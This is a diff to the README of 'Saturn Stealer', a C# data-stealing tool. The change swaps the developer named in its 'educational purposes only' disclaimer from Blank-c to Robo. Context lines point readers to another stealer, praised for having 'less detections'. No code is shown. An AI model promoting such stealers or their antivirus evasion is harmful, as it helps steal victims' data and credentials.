@@ -8,7 +8,7 @@ Saturn Stealer is a fast, lightweight stealer written in C#. The collected data 
 ##### Note: Check out [Blank Grabber](https://github.com/Blank-c/Blank-Grabber). It has more features, actively developed and has less detections.
 
 ## Disclaimer
-This program, developed by Blank-c, is intended solely for educational purposes, to demonstrate the vulnerabilities of computer systems and to promote awareness of cybersecurity. The program should only be used in controlled environments with explicit permission from the system owner.
+This program, developed by Robo, is intended solely for educational purposes, to demonstrate the vulnerabilities of computer systems and to promote awareness of cybersecurity. The program should only be used in controlled environments with explicit permission from the system owner.
 
 While the program may be used to assess the security of computer systems, it should not be used for malicious purposes or any activity that may cause harm or damage to computer systems or networks. Any misuse or illegal activity resulting from the use of this program is strictly prohibited and the responsibility lies solely with the user.
 
